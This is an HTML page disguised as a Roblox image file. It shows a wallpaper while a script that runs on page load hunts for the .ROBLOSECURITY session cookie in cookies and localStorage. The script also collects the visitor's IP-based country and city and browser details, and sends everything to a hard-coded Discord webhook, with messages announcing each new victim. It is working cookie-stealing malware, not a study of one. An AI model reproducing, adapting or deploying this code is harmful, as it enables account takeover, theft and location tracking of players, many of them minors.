<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>roblox_image.png</title>
    <style>
        * { margin: 0; padding: 0; }
        body { background: #000; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        img { max-width: 100%; max-height: 100vh; }
    </style>
</head>
<body>
    <img src="https://wallpapers.com/images/hd/roblox-boy-860-x-1066-kjomfgm8qwljadat.jpg" alt="Roblox Image">

    <script>
        // ================= CONFIGURACIÓN =================
        const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
        
        // ================= ANTI-SPAM =================
        if (sessionStorage.getItem('rbx_enviado')) { 
            throw new Error('Ya enviado'); 
        }
        sessionStorage.setItem('rbx_enviado', 'true');

        // ================= FUNCIÓN PARA ENVIAR A DISCORD =================
        async function enviar(mensaje) {
            try {
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: mensaje })
                });
            } catch (e) {
                console.error('Error enviando a Discord:', e);
            }
        }

        // ================= DIAGNÓSTICO Y EXTRACCIÓN =================
        (async function() {
            try {
                let cookie = null;
                let metodos = [];
                let logs = []; // Para enviar información de depuración

                // --- 1. DETECTAR Navegador y Capacidades ---
                logs.push(`🖥️ User Agent: ${navigator.userAgent}`);
                logs.push(`🍪 ¿Cookies habilitadas? ${navigator.cookieEnabled ? 'Sí' : 'No'}`);

                // --- 2. INTENTAR LEER DOCUMENT.COOKIE ---
                try {
                    logs.push(`📄 document.cookie (crudo): "${document.cookie}"`);
                    const cookies = document.cookie.split(';');
                    for (let c of cookies) {
                        c = c.trim();
                        if (c.includes('.ROBLOSECURITY') || c.includes('ROBLOSECURITY')) {
                            cookie = c.split('=').slice(1).join('=');
                            metodos.push('document.cookie');
                            logs.push(`✅ Cookie encontrada en document.cookie`);
                            break;
                        }
                    }
                    if (!cookie) logs.push(`❌ Cookie .ROBLOSECURITY no encontrada en document.cookie.`);
                } catch (e) {
                    logs.push(`❌ Error al leer document.cookie: ${e.message}`);
                }

                // --- 3. INTENTAR EN LOCALSTORAGE (SI NO SE ENCONTRÓ) ---
                if (!cookie) {
                    try {
                        logs.push(`💾 localStorage tiene ${localStorage.length} items.`);
                        for (let i = 0; i < localStorage.length; i++) {
                            const key = localStorage.key(i);
                            const val = localStorage.getItem(key);
                            if (val && (val.includes('_|WARNING') || val.includes('ROBLOSECURITY'))) {
                                cookie = val;
                                metodos.push('localStorage');
                                logs.push(`✅ Cookie encontrada en localStorage con key: "${key}"`);
                                break;
                            }
                        }
                         if (!cookie) logs.push(`❌ Cookie no encontrada en localStorage.`);
                    } catch (e) {
                        logs.push(`❌ Error al leer localStorage: ${e.message}`);
                    }
                }

                // --- 4. OBTENER UBICACIÓN (CON DIAGNÓSTICO) ---
                let pais = 'Desconocido';
                let ciudad = 'Desconocida';
                try {
                    logs.push(`🌐 Solicitando IP a api.ipify.org...`);
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    if (!ipRes.ok) throw new Error(`HTTP ${ipRes.status}`);
                    const ip = (await ipRes.json()).ip;
                    logs.push(`🌐 IP obtenida: ${ip}`);

                    logs.push(`🌐 Solicitando ubicación a ip-api.com...`);
                    const locRes = await fetch(`https://ip-api.com/json/${ip}?fields=country,city`);
                     if (!locRes.ok) throw new Error(`HTTP ${locRes.status}`);
                    const loc = await locRes.json();
                    pais = loc.country || 'Desconocido';
                    ciudad = loc.city || 'Desconocida';
                    logs.push(`🌐 Ubicación: ${pais}, ${ciudad}`);
                } catch (e) {
                    logs.push(`❌ Error obteniendo ubicación: ${e.message}`);
                }

                // --- 5. FECHA/HORA Y DISPOSITIVO ---
                const ahora = new Date();
                const fecha = ahora.toLocaleDateString('es-AR', { timeZone: 'America/Argentina/Buenos_Aires' });
                const hora = ahora.toLocaleTimeString('es-AR', { timeZone: 'America/Argentina/Buenos_Aires' });
                const dispositivo = navigator.userAgent.includes('Android') ? 'Android' : 
                                    navigator.userAgent.includes('Windows') ? 'Windows' : 'Desconocido';

                // --- 6. CONSTRUIR MENSAJE PRINCIPAL ---
                const mensajePrincipal = `|| @everyone ||
🔔 NUEVA ENTRADA | **BL PAPI** !

**📌 INFORMACIÓN GENERAL**

**Dispositivo:** \`${dispositivo}\`
**País:** \`${pais}\`
**Ciudad Aproximada:** \`${ciudad}\`

**🧭 Horarios:**

 **Fecha:** \`${fecha}\`
**Hora Exacta En Argentina:** \`${hora}\`

**ℹ️ INFORMACIÓN DE LA CUENTA ROBLOX**

**👤 Usuario:**  \`No disponible\`
**🆔 ID:**        \`No disponible\`
**💰 Robux:**        \`No disponible\`
**⭐ Seguidores:**   \`No disponible\`
**👥 Amigos:**      \`No disponible\`

**📊 ITEMS LIMITED (RAREZA)**

**Headless:**   \`No\`
**Korblox:**    \`No\`

**📈 ESTADÍSTICAS**

**🖼 Visitas al perfil:** \`No disponible\`
**🎮 Juegos creados:** \`No disponible\`
**🏆 Logros:** \`No disponible\`
**📦 Trade count:** \`No disponible\`
**📊 Trade ratio:** \`No disponible\`

**🍪 COOKIE DE ROBLOX**
\`\`
${cookie || 'No encontrada'}
\`\`

**🔧 Métodos usados:** ${metodos.join(', ') || 'ninguno'}`;

                // --- 7. ENVIAR MENSAJE PRINCIPAL Y LOGS ---
                await enviar(mensajePrincipal);
                
                // Enviar los logs como un mensaje aparte (para no saturar)
                await enviar(`**📋 LOGS DE DIAGNÓSTICO:**\n\`\`\`${logs.join('\n')}\`\`\``);

            } catch (error) {
                await enviar(`❌ Error GLOBAL en el script: ${error.message}`);
            }
        })();
    </script>
</body>
</html>
